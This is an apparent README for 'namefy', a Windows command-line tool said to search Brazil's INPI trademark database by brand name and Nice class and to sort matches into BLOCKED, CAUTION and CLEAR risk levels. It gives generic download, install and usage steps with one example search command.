# 🚩 namefy - Check Brand Names Fast

[![Download namefy](https://img.shields.io/badge/Download-namefy-important?style=for-the-badge&color=ff6f61)](https://github.com/zcristianls-cell/namefy)

## 📋 What is namefy?

namefy is a simple tool to check if a brand or trademark name is available in Brazil. It searches the official INPI (Instituto Nacional da Propriedade Industrial) database. You can look up names by brand and by product class using the Nice Classification system. The tool shows you matching results, grouped by how risky they are to use. It gives you data in a clear format so you can use it with other programs or tools.

You do not need to know programming to use it. This guide walks you through getting and running namefy on Windows.

## 🎯 Key Features

- Search brand names exactly or find close variations  
- Search multiple product classes at once  
- Automatically get results from multiple pages (up to 50)  
- Try again automatically if a search fails temporarily  
- Shows risk levels: BLOCKED, CAUTION, CLEAR  
- Outputs results in JSON format for easy use  
- Manages search sessions smoothly  

## 🖥️ System Requirements

To run namefy on Windows, your computer should meet these basic needs:

- Windows 10 or newer (64-bit recommended)  
- At least 4 GB of RAM  
- Internet connection to perform the searches  
- About 100 MB of free disk space  
- Administrator rights might be needed for installation  

## 🚀 Getting Started with namefy

Follow these steps to download and use namefy on your Windows PC.

### 1. Download namefy

Visit the main page to get the software:

[![Download namefy](https://img.shields.io/badge/Download-namefy-brightgreen?style=for-the-badge&color=2563eb)](https://github.com/zcristianls-cell/namefy)

Click the link above. It will take you to the GitHub page where you can get the latest version. Look for a “Releases” section or a download button.

### 2. Install namefy

After you download, find the file on your computer (usually in Downloads). Double-click the installer file if there is one. Follow the installation prompts. If it is a ZIP or folder, unzip it to a preferred location.

There is no special setup needed beyond this.

### 3. Run namefy

To start using namefy:

- Open the folder where you installed namefy  
- Find the main program file (it might be called `namefy.exe` or similar)  
- Double-click it to launch the tool  

You may see a command window open since this is a command line tool. This is normal.

### 4. Use namefy

The program runs in your command prompt window. You type instructions like the brand name and the Nice classes you want to search.

An example command looks like this:

```
namefy search "examplebrand" 3 5 9
```

This would search for "examplebrand" across Nice classes 3, 5, and 9.

The tool will then show you the risk ratings and the matching brand names found on INPI.

## 🔧 How to Interpret Results

namefy classifies the search results into three groups:

- **BLOCKED**: These names are very close or identical to your search and may stop you from using your brand.  
- **CAUTION**: These names are somewhat similar and may cause legal issues.  
- **CLEAR**: These names look different enough to be safe to use.  

All results are provided in a JSON file as well. This file lists conflicts, recommendations, and a summary of your search. You can use this data with other software or workflows.

## ❓ FAQ

**Does namefy require internet?**  
Yes, it connects to the INPI website to get the latest data.

**Can I search for multiple brands at once?**  
Currently, you can search one brand name at a time, but across multiple classes.

**What is the Nice Classification?**  
It is an international standard to classify products and services for trademarks. Each class covers different goods or services.

**What if the search fails?**  
namefy tries three times automatically. If it still fails, check your internet connection and try again.

## ⚙️ Customizing Searches

You can control how the search works with these options:

- **Exact mode** - only find brands that match exactly  
- **Radical mode** - find similar names and variations  
- **Parallel class searches** - speed up by searching classes at the same time  
- **Automatic pagination** - get all pages up to 50  
- **Risk classification thresholds** - adjust how strict the risk scoring is  

These settings are adjusted via command line options or configuration files that come with the tool.

## 📂 Where to Get Help

Look in the downloaded folder for a README or help file. The main GitHub page also has documentation. You can open an “issue” on GitHub if you find a problem or want to request a feature.

## 🔽 Download and Setup

Visit this page to download and start using namefy:

[Download namefy](https://github.com/zcristianls-cell/namefy)

Click on it to get the latest software and instructions.

---

This guide explains how to get namefy running so you can quickly check brand name availability. It does not require advanced skills and uses clear command inputs to make the process simple.